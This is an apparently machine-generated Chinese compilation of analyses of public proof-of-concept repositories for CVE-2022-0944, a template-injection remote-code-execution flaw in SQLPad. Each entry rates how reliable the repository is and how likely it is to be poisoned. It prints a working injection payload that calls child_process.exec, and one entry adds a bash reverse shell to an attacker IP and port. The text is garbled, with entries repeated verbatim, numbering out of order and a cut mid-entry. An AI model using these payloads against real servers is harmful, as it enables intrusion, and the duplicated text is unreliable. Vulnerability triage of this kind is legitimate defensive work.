
**有效性：**

根据提供的漏洞利用代码，该PoC使用 Python 编写，通过向 `/api/test-connection` 发送包含恶意payload的请求来触发漏洞。Payload 使用 `process.mainModule.require('child_process').exec()` 执行系统命令。代码中还包含一个反弹shell的功能，方便攻击者进行利用。该POC代码看起来是有效的，因为漏洞信息和代码逻辑是符合的.

**投毒风险：**

查看了提供的PoC代码，包含`LICENSE`，`README.md` 和 `main.py` 文件，没有发现明显的恶意代码或者后门，只是实现了漏洞的利用。代码功能比较直观，主要是发送恶意请求并监听端口获取反弹shell。因此，投毒风险评估为0%。

**利用方式：**

1.  **身份验证（可选）：** 如果目标SQLPad实例启用了身份验证，攻击者需要提供有效的用户名和密码才能利用该漏洞。PoC代码提供了身份验证功能。
2.  **发送恶意请求：** 攻击者构造一个包含恶意payload的JSON数据，并将其发送到 `/api/test-connection` 接口。Payload中利用了模板注入的特性，执行任意系统命令，启动反弹shell.
3.  **监听反弹Shell：** 攻击者在本地设置一个监听器，等待目标服务器连接，从而获得对目标服务器的控制权。

总而言之，该漏洞的利用方式简单直接，只需要发送一个精心构造的请求即可实现远程代码执行，风险极高。在sqlpad 6.10.1之前的版本应该升级。

**项目地址:** [shhrew/CVE-2022-0944](https://github.com/shhrew/CVE-2022-0944)

**漏洞详情:** [CVE-2022-0944](https://nvd.nist.gov/vuln/detail/CVE-2022-0944)

---

## POC #9

**来源**: [CVE-2022-0944-toneillcodes_CVE-2022-0944.md](../2022/CVE-2022-0944-toneillcodes_CVE-2022-0944.md)

## CVE-2022-0944-sqlpad-RCE

**漏洞编号:** CVE-2022-0944

**漏洞类型:** 模板注入导致远程代码执行

**影响应用:** sqlpad

**危害等级:** 高危，可导致完全控制服务器

**影响版本:** < 6.10.1

**利用条件:** 需要目标实例存在/api/test-connection接口, 需要较高权限才能访问该接口

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2022-0944是SQLPad 6.10.1之前版本中存在的一个模板注入漏洞。攻击者可以通过向`/api/test-connection`端点发送特制的请求，在服务器上执行任意代码，从而完全控制服务器。根据漏洞库信息和搜索结果，该漏洞危害巨大，易于利用。漏洞利用代码中的Python脚本通过构造包含恶意payload的JSON数据，并将其发送到目标服务器的`/api/test-connection`端点，从而触发远程代码执行。Payload使用 `child_process.exec` 函数来执行操作系统命令，并建立反向shell连接到攻击者的机器。 检查漏洞利用代码，没有发现明显的投毒迹象。Payload部分是标准的反向shell，没有其他恶意行为。因此，投毒风险较低。

**利用方式：**
1.  攻击者需要访问SQLPad实例的`/api/test-connection`接口。
2.  攻击者构造一个包含恶意模板注入payload的JSON请求。Payload使用JavaScript代码调用`child_process.exec`函数来执行任意命令。
3.  攻击者将构造的JSON请求发送到`/api/test-connection`端点。
4.  SQLPad服务器处理该请求时，模板引擎会解析恶意payload，导致执行攻击者指定的命令。
5.  攻击者可以在服务器上执行任意代码，例如创建反向shell连接，从而完全控制服务器。

**项目地址:** [toneillcodes/CVE-2022-0944](https://github.com/toneillcodes/CVE-2022-0944)

**漏洞详情:** [CVE-2022-0944](https://nvd.nist.gov/vuln/detail/CVE-2022-0944)

---



---

## POC #3

**来源**: [CVE-2022-0944-Artemisxxx37_OverlayFS-PrivEsc-CVE-2022-0944.md](../2022/CVE-2022-0944-Artemisxxx37_OverlayFS-PrivEsc-CVE-2022-0944.md)

## CVE-2022-0944 - SQLPad Template Injection RCE

**漏洞编号:** CVE-2022-0944

**漏洞类型:** 模板注入导致远程代码执行 (RCE)

**影响应用:** SQLPad

**危害等级:** 严重，可能导致完全系统控制

**影响版本:** < 6.10.1

**利用条件:** 需要高权限用户账户

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-0944 是 SQLPad 中一个严重的漏洞，攻击者可以通过连接测试端点的模板注入来执行远程代码。根据漏洞库信息和搜索引擎结果，这是一个已知的漏洞，并且存在公开的漏洞利用代码。

**有效性：**

提供的漏洞利用代码（`main.py`）针对此漏洞，并包含使用示例。该代码利用模板注入漏洞，允许攻击者在 SQLPad 服务器上执行任意代码。 根据github上的信息，经验证漏洞可以利用成功。

**投毒风险：**

审查提供的文件，`README.md` 和 `SECURITY.md` 文件看起来标准且无恶意内容。`main.py` 是漏洞利用的核心，需要仔细分析。虽然代码本身的功能是利用漏洞，但仍然存在隐藏恶意代码的可能性，如：

*   **数据回传：** 漏洞利用脚本可能在未经授权的情况下将目标服务器的信息发送给攻击者。
*   **后门植入：** 脚本可能在目标系统上安装后门，以便后续访问。
*   **资源消耗：** 脚本可能消耗目标系统资源，导致拒绝服务。
    
尽管存在这些风险，但脚本的主要目的是利用已知的漏洞。由于脚本代码相对较短且直接，隐藏复杂恶意代码的可能性较低。 综合评估，投毒风险约为 10%，主要基于可能存在的隐蔽数据回传或简单的后门植入。

**利用方式：**

1.  **前提条件：**
    *   目标系统运行的是 SQLPad 6.10.1 之前的版本。
    *   攻击者需要拥有 SQLPad 的高权限用户账户（根据CVE描述，PrivilegesRequired为HIGH）。
2.  **漏洞触发：**
    *   攻击者使用 `main.py` 脚本，提供目标 SQLPad 的 URL、监听 IP 地址和端口，以及高权限用户名和密码。
    *   脚本利用模板注入漏洞，在连接测试端点注入恶意代码。
3.  **远程代码执行：**
    *   注入的恶意代码在 SQLPad 服务器上执行，通常会建立一个反向 shell 连接到攻击者的监听器。
4.  **控制系统：**
    *   攻击者通过反向 shell 获取对 SQLPad 服务器的控制权，可以执行任意命令，访问敏感数据，甚至完全控制系统。

**项目地址:** [Artemisxxx37/OverlayFS-PrivEsc-CVE-2022-0944](https://github.com/Artemisxxx37/OverlayFS-PrivEsc-CVE-2022-0944)

**漏洞详情:** [CVE-2022-0944](https://nvd.nist.gov/vuln/detail/CVE-2022-0944)

---

## POC #4

**来源**: [CVE-2022-0944-FlojBoj_CVE-2022-0944.md](../2022/CVE-2022-0944-FlojBoj_CVE-2022-0944.md)

## CVE-2022-0944-SQLPad-模板注入导致RCE

**漏洞编号:** CVE-2022-0944

**漏洞类型:** 模板注入

**影响应用:** SQLPad

**危害等级:** 高危，可导致远程代码执行

**影响版本:** <= 6.10.0

**利用条件:** 需要高权限用户凭证

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

该漏洞存在于SQLPad的connection test接口，由于使用了模板引擎且未对用户输入进行充分的过滤，导致攻击者可以通过构造恶意模板代码，在服务器端执行任意命令。根据提供的POC代码，利用方式如下：

1.  **身份验证：** 如果需要，首先使用提供的用户名和密码登录SQLPad应用，获取Cookie。
2.  **构造恶意JSON数据：**  构造包含恶意模板代码的JSON数据，其中`database`字段包含利用`process.mainModule.require('child_process').exec()`执行命令的payload。Payload形如：`{{ process.mainModule.require('child_process').exec('命令') }}`
3.  **发送POST请求：** 将构造的JSON数据通过POST请求发送到`/api/test-connection`接口。如果需要，在请求头中包含Cookie。
4.  **执行命令：**  服务器端收到请求后，模板引擎解析`database`字段中的恶意代码，从而执行攻击者指定的命令。
5. **有效性:** 根据漏洞信息和POC，此漏洞的POC代码有效，可以实现远程代码执行。
6.  **投毒风险分析：**  查看了`exploit.py`脚本，该脚本的功能是发送带有恶意payload的请求到目标SQLPad实例的`/api/test-connection`接口，从而触发RCE。没有发现任何其他隐藏的恶意代码，例如上传后门、修改文件等。因此，可以认为该POC代码不存在投毒风险，投毒风险概率为0%。

**项目地址:** [FlojBoj/CVE-2022-0944](https://github.com/FlojBoj/CVE-2022-0944)

**漏洞详情:** [CVE-2022-0944](https://nvd.nist.gov/vuln/detail/CVE-2022-0944)

---

## POC #5

**来源**: [CVE-2022-0944-LipeOzyy_SQLPad-RCE-Exploit-CVE-2022-0944.md](../2022/CVE-2022-0944-LipeOzyy_SQLPad-RCE-Exploit-CVE-2022-0944.md)

## CVE-2022-0944-sqlpad-RCE

**漏洞编号:** CVE-2022-0944

**漏洞类型:** 模板注入导致RCE

**影响应用:** sqlpad

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** < 6.10.1

**利用条件:** 需要具有连接测试的权限（高权限用户）

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2022-0944 是 sqlpad 中存在的一个模板注入漏洞，位于连接测试端点。攻击者可以通过构造恶意的模板注入payload，在目标服务器上执行任意代码，从而获得服务器的控制权。

**有效性：**

根据漏洞库信息、搜索结果以及提供的漏洞利用代码，该漏洞利用是有效的。漏洞库信息明确指出存在模板注入导致RCE的漏洞，搜索结果也指向了相关漏洞细节和POC。提供的PHP代码通过向 `/api/test-connection` 发送包含恶意payload的JSON数据，从而触发远程代码执行。

**投毒风险：**

分析提供的`exploit.php`代码，未发现明显的恶意代码或后门。该脚本的功能主要是发送包含模板注入payload的HTTP请求，以触发目标服务器上的RCE。脚本的逻辑清晰，且直接使用了cURL库发送请求，没有发现任何尝试隐藏或执行其他恶意操作的代码。脚本只是一个exploit，不是后门。

**利用方式：**

1.  **漏洞点：** `/api/test-connection` 接口的 `database` 字段存在模板注入。
2.  **攻击步骤：**
    *   攻击者需要先监听一个端口（例如4444）。
    *   攻击者构造包含恶意代码的JSON数据，恶意代码通常是反弹shell的命令。
    *   攻击者将构造好的JSON数据发送到 `/api/test-connection` 接口。
    *   如果目标服务器存在漏洞，且模板引擎执行了攻击者的恶意代码，目标服务器会反弹shell到攻击者的监听端口。
3.  **Payload：**

    ```
    {{ process.mainModule.require('child_process').exec('/bin/bash -c "bash -i >& /dev/tcp/$attacker_ip/$attacker_port 0>&1"') }}
    ```

    该payload使用Node.js的 `child_process.exec` 函数执行系统命令，`/bin/bash -c` 执行一段bash脚本，该脚本的作用是创建一个反向shell连接到攻击者的IP地址和端口。

**总结：**

CVE-2022-0944 是一个高危漏洞，攻击者可以利用该漏洞远程执行任意代码。需要及时升级 sqlpad 到 6.10.1 或更高版本。

**项目地址:** [LipeOzyy/SQLPad-RCE-Exploit-CVE-2022-0944](https://github.com/LipeOzyy/SQLPad-RCE-Exploit-CVE-2022-0944)

**漏洞详情:** [CVE-2022-0944](https://nvd.nist.gov/vuln/detail/CVE-2022-0944)

---

## POC #6

**来源**: [CVE-2022-0944-Philip-Otter_CVE-2022-0944_RCE_Automation.md](../2022/CVE-2022-0944-Philip-Otter_CVE-2022-0944_RCE_Automation.md)

## CVE-2022-0944-sqlpad-TemplateInjection-RCE

**漏洞编号:** CVE-2022-0944

**漏洞类型:** 模板注入

**影响应用:** sqlpad

**危害等级:** 高危，可导致远程代码执行

**影响版本:** < 6.10.1

**利用条件:** 需要目标sqlpad实例的网络访问，以及具有创建连接权限的高权限用户。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-0944是sqlpad中存在的一个模板注入漏洞，存在于连接测试端点。攻击者可以通过构造恶意的模板注入payload，在目标服务器上执行任意代码，从而完全控制服务器。 

**漏洞利用方式：**

1.  **身份验证：** 首先，攻击者需要拥有 sqlpad 实例中具有创建连接权限的用户身份，一般是管理员权限。
2.  **构造Payload：** 攻击者构造包含恶意代码的模板注入Payload。该Payload利用了Node.js的`child_process.exec`函数来执行系统命令。从提供的漏洞利用代码中可以看到，payload的形式为`{{ process.mainModule.require('child_process').exec('COMMAND') }}`，其中COMMAND是要执行的命令。
3.  **发送请求：**  攻击者通过POST请求将包含Payload的JSON数据发送到`/api/connections`端点，创建一个新的数据库连接配置。关键在于`data.database`字段，该字段会被模板引擎解析，导致代码执行。
4.  **触发漏洞：**  创建连接后，攻击者通过GET请求访问`/api/connections/{id}/schema`端点，触发连接测试，从而执行Payload。
5.  **反弹shell (可选)：**  为了方便利用，攻击者通常使用Payload执行反弹shell命令，从而获得对目标服务器的控制权。
6.  **利用代码分析:**
    * `exploit.py`是一个Python脚本，实现了CVE-2022-0944漏洞的自动化利用。
    * 脚本接受目标URL、攻击者IP等参数。
    * 脚本首先创建一个随机字符串，作为连接名称。
    * 脚本构造包含恶意代码的JSON数据，并将其发送到`/api/connections`端点。
    * 脚本通过GET请求访问`/api/connections/{id}/schema`端点，触发漏洞，从而执行Payload。
    * 脚本可以监听指定端口，接收命令执行结果（通过base64编码）。

**投毒风险评估：**

该代码主要实现了漏洞利用功能，但仍存在一定的投毒风险，评估为10%。理由如下：

*   **潜在的恶意命令注入：** 攻击者可以通过`-c`参数指定要执行的命令。如果脚本没有对该参数进行充分的验证和过滤，攻击者可能会注入恶意命令，例如下载和执行额外的恶意程序。
*   **后门植入：** 攻击者可能修改脚本，在成功利用漏洞后，在目标服务器上植入后门，以便长期控制目标系统。
*   **信息收集：** 脚本可以收集目标服务器的信息，例如操作系统版本、已安装的软件等。这些信息可能会被泄露给攻击者，用于进一步的攻击。

因此，在使用该脚本时，需要仔细检查代码，确保没有恶意代码被注入，并采取必要的安全措施，例如限制脚本的执行权限、监控脚本的网络活动等。

**项目地址:** [Philip-Otter/CVE-2022-0944_RCE_Automation](https://github.com/Philip-Otter/CVE-2022-0944_RCE_Automation)

**漏洞详情:** [CVE-2022-0944](https://nvd.nist.gov/vuln/detail/CVE-2022-0944)

---

## POC #7

**来源**: [CVE-2022-0944-Robocopsita_CVE-2022-0944_RCE_POC.md](../2022/CVE-2022-0944-Robocopsita_CVE-2022-0944_RCE_POC.md)

## CVE-2022-0944-SQLPad-模板注入导致RCE

**漏洞编号:** CVE-2022-0944

**漏洞类型:** 模板注入导致RCE

**影响应用:** SQLPad

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** < 6.10.1

**利用条件:** 需要高权限用户才能利用

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2022-0944是SQLPad版本低于6.10.1中存在的一个模板注入漏洞。该漏洞位于connection test endpoint。攻击者可以利用该漏洞在服务器上执行任意代码。根据漏洞描述和提供的POC代码，利用方式如下：

1.  **漏洞原理：** SQLPad在测试数据库连接时，没有充分过滤用户提供的数据库配置信息，导致攻击者可以在数据库配置（例如数据库名称）中使用模板引擎的语法。
2.  **攻击步骤：**
    *   攻击者需要具有高权限才能访问connection test endpoint。
    *   攻击者构造包含恶意代码的payload。该payload利用`process.mainModule.require('child_process').exec()`来执行系统命令。POC中使用反向shell作为例子。
    *   攻击者将构造好的payload插入到数据库连接配置的`database`字段中，并发送到`/api/test-connection`接口。
    *   服务器在测试连接时，会解析payload中的模板代码，从而执行攻击者指定的系统命令，实现远程代码执行。
3.  **POC有效性：** 提供的POC代码利用python脚本自动化了上述攻击过程，通过发送精心构造的POST请求，可以触发漏洞并获得反向shell。根据代码逻辑和漏洞描述，该POC代码是有效的。
4.  **投毒风险：** 代码的`README.md`中声明仅用于教育目的，并免责。代码本身主要功能是发送包含恶意payload的HTTP请求，并在本地监听端口接收反向shell。虽然代码主要功能是漏洞利用，但仍然存在一些潜在的投毒风险：
    *   **Netcat依赖：** POC依赖于系统安装`netcat`，如果目标系统没有`netcat`，漏洞利用会失败。但是，如果攻击者修改了脚本，将反向shell的方式修改为使用python或其他目标系统更可能存在的工具，可能会增加攻击成功率。
    *   **隐蔽后门：** 理论上，脚本可以被修改为在受害者机器上安装持久性后门，例如添加计划任务或者修改启动脚本，但当前的脚本未发现此类行为。
    *   **依赖风险：** 脚本依赖于`requests`库。如果攻击者修改了`requirements.txt`文件，添加恶意的依赖包，可能导致用户安装恶意库。
    *   **安全声明免责：**虽然声明了免责条款，但是仍要小心使用，务必在授权的渗透测试场景中使用。
    *   综合评估，由于POC的主要功能是RCE利用，且代码相对简单，隐藏恶意代码的难度较高。因此投毒风险较低，估计在5%左右。

**项目地址:** [Robocopsita/CVE-2022-0944_RCE_POC](https://github.com/Robocopsita/CVE-2022-0944_RCE_POC)

**漏洞详情:** [CVE-2022-0944](https://nvd.nist.gov/vuln/detail/CVE-2022-0944)

---

## POC #8

**来源**: [CVE-2022-0944-shhrew_CVE-2022-0944.md](../2022/CVE-2022-0944-shhrew_CVE-2022-0944.md)

## CVE-2022-0944 - SQLPad 模板注入导致RCE

**漏洞编号:** CVE-2022-0944

**漏洞类型:** 模板注入

**影响应用:** SQLPad

**危害等级:** 高危，可导致远程代码执行

**影响版本:** < 6.10.1

**利用条件:** 需要高权限用户访问，目标存在 /api/test-connection 接口

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2022-0944 漏洞是 SQLPad 6.10.1 之前版本中存在的一个模板注入漏洞。该漏洞位于 `/api/test-connection` 接口，攻击者可以通过构造恶意的模板注入payload，执行任意代码。根据漏洞库信息，该漏洞的CVSS 3.0评分为9.1，属于严重级别。搜索引擎结果显示，已经存在公开的漏洞利用代码。

**有效性：**

根据提供的漏洞利用代码，该PoC使用 Python 编写，通过向 `/api/test-connection` 发送包含恶意payload的请求来触发漏洞。Payload 使用 `process.mainModule.require('child_process').exec()` 执行系统命令。代码中还包含一个反弹shell的功能，方便攻击者进行利用。该POC代码看起来是有效的，因为漏洞信息和代码逻辑是符合的.

**投毒风险：**

查看了提供的PoC代码，包含`LICENSE`，`README.md` 和 `main.py` 文件，没有发现明显的恶意代码或者后门，只是实现了漏洞的利用。代码功能比较直观，主要是发送恶意请求并监听端口获取反弹shell。因此，投毒风险评估为0%。

**利用方式：**

1.  **身份验证（可选）：** 如果目标SQLPad实例启用了身份验证，攻击者需要提供有效的用户名和密码才能利用该漏洞。PoC代码提供了身份验证功能。
2.  **发送恶意请求：** 攻击者构造一个包含恶意payload的JSON数据，并将其发送到 `/api/test-connection` 接口。Payload中利用了模板注入的特性，执行任意系统命令，启动反弹shell.
3.  **监听反弹Shell：** 攻击者在本地设置一个监听器，等待目标服务器连接，从而获得对目标服务器的控制权。

总而言之，该漏洞的利用方式简单直接，只需要发送一个精心构造的请求即可实现远程代码执行，风险极高。在sqlpad 6.10.1之前的版本应该升级。

**项目地址:** [shhrew/CVE-2022-0944](https://github.com/shhrew/CVE-2022-0944)

**漏洞详情:** [CVE-2022-0944](https://nvd.nist.gov/vuln/detail/CVE-2022-0944)

---

## POC #9

**来源**: [CVE-2022-0944-toneillcodes_CVE-2022-0944.md](../2022/CVE-2022-0944-toneillcodes_CVE-2022-0944.md)

## CVE-2022-0944-sqlpad-RCE

**漏洞编号:** CVE-2022-0944

**漏洞类型:** 模板注入导致远程代码执行

**影响应用:** sqlpad

**危害等级:** 高危，可导致完全控制服务器

**影响版本:** < 6.10.1

**利用条件:** 需要目标实例存在/api/test-connection接口, 需要较高权限才能访问该接口

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2022-0944是SQLPad 6.10.1之前版本中存在的一个模板注入漏洞。攻击者可以通过向`/api/test-connection`端点发送特制的请求，在服务器上执行任意代码，从而完全控制服务器。根据漏洞库信息和搜索结果，该漏洞危害巨大，易于利用。漏洞利用代码中的Python脚本通过构造包含恶意payload的JSON数据，并将其发送到目标服务器的`/api/test-connection`端点，从而触发远程代码执行。Payload使用 `child_process.exec` 函数来执行操作系统命令，并建立反向shell连接到攻击者的机器。 检查漏洞利用代码，没有发现明显的投毒迹象。Payload部分是标准的反向shell，没有其他恶意行为。因此，投毒风险较低。

**利用方式：**
1.  攻击者需要访问SQLPad实例的`/api/test-connection`接口。
2.  攻击者构造一个包含恶意模板注入payload的JSON请求。Payload使用JavaScript代码调用`child_process.exec`函数来执行任意命令。
3.  攻击者将构造的JSON请求发送到`/api/test-connection`端点。
4.  SQLPad服务器处理该请求时，模板引擎会解析恶意payload，导致执行攻击者指定的命令。
5.  攻击者可以在服务器上执行任意代码，例如创建反向shell连接，从而完全控制服务器。

**项目地址:** [toneillcodes/CVE-2022-0944](https://github.com/toneillcodes/CVE-2022-0944)

**漏洞详情:** [CVE-2022-0944](https://nvd.nist.gov/vuln/detail/CVE-2022-0944)

---



---

## POC #3

**来源**: [CVE-2022-0944-Artemisxxx37_OverlayFS-PrivEsc-CVE-2022-0944.md](../2022/CVE-2022-0944-Artemisxxx37_OverlayFS-PrivEsc-CVE-2022-0944.md)

## CVE-2022-0944 - SQLPad Template Injection RCE

**漏洞编号:** CVE-2022-0944

**漏洞类型:** 模板注入导致远程代码执行 (RCE)

**影响应用:** SQLPad

**危害等级:** 严重，可能导致完全系统控制

**影响版本:** < 6.10.1

**利用条件:** 需要高权限用户账户

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-0944 是 SQLPad 中一个严重的漏洞，攻击者可以通过连接测试端点的模板注入来执行远程代码。根据漏洞库信息和搜索引擎结果，这是一个已知的漏洞，并且存在公开的漏洞利用代码。

**有效性：**

提供的漏洞利用代码（`main.py`）针对此漏洞，并包含使用示例。该代码利用模板注入漏洞，允许攻击者在 SQLPad 服务器上执行任意代码。 根据github上的信息，经验证漏洞可以利用成功。

**投毒风险：**

审查提供的文件，`README.md` 和 `SECURITY.md` 文件看起来标准且无恶意内容。`main.py` 是漏洞利用的核心，需要仔细分析。虽然代码本身的功能是利用漏洞，但仍然存在隐藏恶意代码的可能性，如：

*   **数据回传：** 漏洞利用脚本可能在未经授权的情况下将目标服务器的信息发送给攻击者。
*   **后门植入：** 脚本可能在目标系统上安装后门，以便后续访问。
*   **资源消耗：** 脚本可能消耗目标系统资源，导致拒绝服务。
    
尽管存在这些风险，但脚本的主要目的是利用已知的漏洞。由于脚本代码相对较短且直接，隐藏复杂恶意代码的可能性较低。 综合评估，投毒风险约为 10%，主要基于可能存在的隐蔽数据回传或简单的后门植入。

**利用方式：**

1.  **前提条件：**
    *   目标系统运行的是 SQLPad 6.10.1 之前的版本。
    *   攻击者需要拥有 SQLPad 的高权限用户账户（根据CVE描述，PrivilegesRequired为HIGH）。
2.  **漏洞触发：**
    *   攻击者使用 `main.py` 脚本，提供目标 SQLPad 的 URL、监听 IP 地址和端口，以及高权限用户名和密码。
    *   脚本利用模板注入漏洞，在连接测试端点注入恶意代码。
3.  **远程代码执行：**
    *   注入的恶意代码在 SQLPad 服务器上执行，通常会建立一个反向 shell 连接到攻击者的监听器。
4.  **控制系统：**
    *   攻击者通过反向 shell 获取对 SQLPad 服务器的控制权，可以执行任意命令，访问敏感数据，甚至完全控制系统。

**项目地址:** [Artemisxxx37/OverlayFS-PrivEsc-CVE-2022-0944](https://github.com/Artemisxxx37/OverlayFS-PrivEsc-CVE-2022-0944)

**漏洞详情:** [CVE-2022-0944](https://nvd.nist.gov/vuln/detail/CVE-2022-0944)

---

## POC #4

**来源**: [CVE-2022-0944-FlojBoj_CVE-2022-0944.md](../2022/CVE-2022-0944-FlojBoj_CVE-2022-0944.md)

## CVE-2022-0944-SQLPad-模板注入导致RCE

**漏洞编号:** CVE-2022-0944

**漏洞类型:** 模板注入

**影响应用:** SQLPad

**危害等级:** 高危，可导致远程代码执行

**影响版本:** <= 6.10.0

**利用条件:** 需要高权限用户凭证

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

该漏洞存在于SQLPad的connection test接口，由于使用了模板引擎且未对用户输入进行充分的过滤，导致攻击者可以通过构造恶意模板代码，在服务器端执行任意命令。根据提供的POC代码，利用方式如下：

1.  **身份验证：** 如果需要，首先使用提供的用户名和密码登录SQLPad应用，获取Cookie。
2.  **构造恶意JSON数据：**  构造包含恶意模板代码的JSON数据，其中`database`字段包含利用`process.mainModule.require('child_process').exec()`执行命令的payload。Payload形如：`{{ process.mainModule.require('child_process').exec('命令') }}`
3.  **发送POST请求：** 将构造的JSON数据通过POST请求发送到`/api/test-connection`接口。如果需要，在请求头中包含Cookie。
4.  **执行命令：**  服务器端收到请求后，模板引擎解析`database`字段中的恶意代码，从而执行攻击者指定的命令。
5. **有效性:** 根据漏洞信息和POC，此漏洞的POC代码有效，可以实现远程代码执行。
6.  **投毒风险分析：**  查看了`exploit.py`脚本，该脚本的功能是发送带有恶意payload的请求到目标SQLPad实例的`/api/test-connection`接口，从而触发RCE。没有发现任何其他隐藏的恶意代码，例如上传后门、修改文件等。因此，可以认为该POC代码不存在投毒风险，投毒风险概率为0%。

**项目地址:** [FlojBoj/CVE-2022-0944](https://github.com/FlojBoj/CVE-2022-0944)

**漏洞详情:** [CVE-2022-0944](https://nvd.nist.gov/vuln/detail/CVE-2022-0944)

---

## POC #5

**来源**: [CVE-2022-0944-LipeOzyy_SQLPad-RCE-Exploit-CVE-2022-0944.md](../2022/CVE-2022-0944-LipeOzyy_SQLPad-RCE-Exploit-CVE-2022-0944.md)

## CVE-2022-0944-sqlpad-RCE

**漏洞编号:** CVE-2022-0944

**漏洞类型:** 模板注入导致RCE

**影响应用:** sqlpad

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** < 6.10.1

**利用条件:** 需要具有连接测试的权限（高权限用户）

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2022-0944 是 sqlpad 中存在的一个模板注入漏洞，位于连接测试端点。攻击者可以通过构造恶意的模板注入payload，在目标服务器上执行任意代码，从而获得服务器的控制权。

**有效性：**

根据漏洞库信息、搜索结果以及提供的漏洞利用代码，该漏洞利用是有效的。漏洞库信息明确指出存在模板注入导致RCE的漏洞，搜索结果也指向了相关漏洞细节和POC。提供的PHP代码通过向 `/api/test-connection` 发送包含恶意payload的JSON数据，从而触发远程代码执行。

**投毒风险：**

分析提供的`exploit.php`代码，未发现明显的恶意代码或后门。该脚本的功能主要是发送包含模板注入payload的HTTP请求，以触发目标服务器上的RCE。脚本的逻辑清晰，且直接使用了cURL库发送请求，没有发现任何尝试隐藏或执行其他恶意操作的代码。脚本只是一个exploit，不是后门。

**利用方式：**

1.  **漏洞点：** `/api/test-connection` 接口的 `database` 字段存在模板注入。
2.  **攻击步骤：**
    *   攻击者需要先监听一个端口（例如4444）。
    *   攻击者构造包含恶意代码的JSON数据，恶意代码通常是反弹shell的命令。
    *   攻击者将构造好的JSON数据发送到 `/api/test-connection` 接口。
    *   如果目标服务器存在漏洞，且模板引擎执行了攻击者的恶意代码，目标服务器会反弹shell到攻击者的监听端口。
3.  **Payload：**

    ```
    {{ process.mainModule.require('child_process').exec('/bin/bash -c "bash -i >& /dev/tcp/$attacker_ip/$attacker_port 0>&1"') }}
    ```

    该payload使用Node.js的 `child_process.exec` 函数执行系统命令，`/bin/bash -c` 执行一段bash脚本，该脚本的作用是创建一个反向shell连接到攻击者的IP地址和端口。

**总结：**

CVE-2022-0944 是一个高危漏洞，攻击者可以利用该漏洞远程执行任意代码。需要及时升级 sqlpad 到 6.10.1 或更高版本。

**项目地址:** [LipeOzyy/SQLPad-RCE-Exploit-CVE-2022-0944](https://github.com/LipeOzyy/SQLPad-RCE-Exploit-CVE-2022-0944)

**漏洞详情:** [CVE-2022-0944](https://nvd.nist.gov/vuln/detail/CVE-2022-0944)

---

## POC #6

**来源**: [CVE-2022-0944-Philip-Otter_CVE-2022-0944_RCE_Automation.md](../2022/CVE-2022-0944-Philip-Otter_CVE-2022-0944_RCE_Automation.md)

## CVE-2022-0944-sqlpad-TemplateInjection-RCE

**漏洞编号:** CVE-2022-0944

**漏洞类型:** 模板注入

**影响应用:** sqlpad

**危害等级:** 高危，可导致远程代码执行

**影响版本:** < 6.10.1

**利用条件:** 需要目标sqlpad实例的网络访问，以及具有创建连接权限的高权限用户。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-0944是sqlpad中存在的一个模板注入漏洞，存在于连接测试端点。攻击者可以通过构造恶意的模板注入payload，在目标服务器上执行任意代码，从而完全控制服务器。 

**漏洞利用方式：**

1.  **身份验证：** 首先，攻击者需要拥有 sqlpad 实例中具有创建连接权限的用户身份，一般是管理员权限。
2.  **构造Payload：** 攻击者构造包含恶意代码的模板注入Payload。该Payload利用了Node.js的`child_process.exec`函数来执行系统命令。从提供的漏洞利用代码中可以看到，payload的形式为`{{ process.mainModule.require('child_process').exec('COMMAND') }}`，其中COMMAND是要执行的命令。
3.  **发送请求：**  攻击者通过POST请求将包含Payload的JSON数据发送到`/api/connections`端点，创建一个新的数据库连接配置。关键在于`data.database`字段，该字段会被模板引擎解析，导致代码执行。
4.  **触发漏洞：**  创建连接后，攻击者通过GET请求访问`/api/connections/{id}/schema`端点，触发连接测试，从而执行Payload。
5.  **反弹shell (可选)：**  为了方便利用，攻击者通常使用Payload执行反弹shell命令，从而获得对目标服务器的控制权。
6.  **利用代码分析:**
    * `exploit.py`是一个Python脚本，实现了CVE-2022-0944漏洞的自动化利用。
    * 脚本接受目标URL、攻击者IP等参数。
    * 脚本首先创建一个随机字符串，作为连接名称。
    * 脚本构造包含恶意代码的JSON数据，并将其发送到`/api/connections`端点。
    * 脚本通过GET请求访问`/api/connections/{id}/schema`端点，触发漏洞，从而执行Payload。
    * 脚本可以监听指定端口，接收命令执行结果（通过base64编码）。

**投毒风险评估：**

该代码主要实现了漏洞利用功能，但仍存在一定的投毒风险，评估为10%。理由如下：

*   **潜在的恶意命令注入：** 攻击者可以通过`-c`参数指定要执行的命令。如果脚本没有对该参数进行充分的验证和过滤，攻击者可能会注入恶意命令，例如下载和执行额外的恶意程序。
*   **后门植入：** 攻击者可能修改脚本，在成功利用漏洞后，在目标服务器上植入后门，以便长期控制目标系统。
*   **信息收集：** 脚本可以收集目标服务器的信息，例如操作系统版本、已安装的软件等。这些信息可能会被泄露给攻击者，用于进一步的攻击。

因此，在使用该脚本时，需要仔细检查代码，确保没有恶意代码被注入，并采取必要的安全措施，例如限制脚本的执行权限、监控脚本的网络活动等。

**项目地址:** [Philip-Otter/CVE-2022-0944_RCE_Automation](https://github.com/Philip-Otter/CVE-2022-0944_RCE_Automation)

**漏洞详情:** [CVE-2022-0944](https://nvd.nist.gov/vuln/detail/CVE-2022-0944)

---

## POC #7

**来源**: [CVE-2022-0944-Robocopsita_CVE-2022-0944_RCE_POC.md](../2022/CVE-2022-0944-Robocopsita_CVE-2022-0944_RCE_POC.md)

## CVE-2022-0944-SQLPad-模板注入导致RCE

**漏洞编号:** CVE-2022-0944

**漏洞类型:** 模板注入导致RCE

**影响应用:** SQLPad

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** < 6.10.1

**利用条件:** 需要高权限用户才能利用

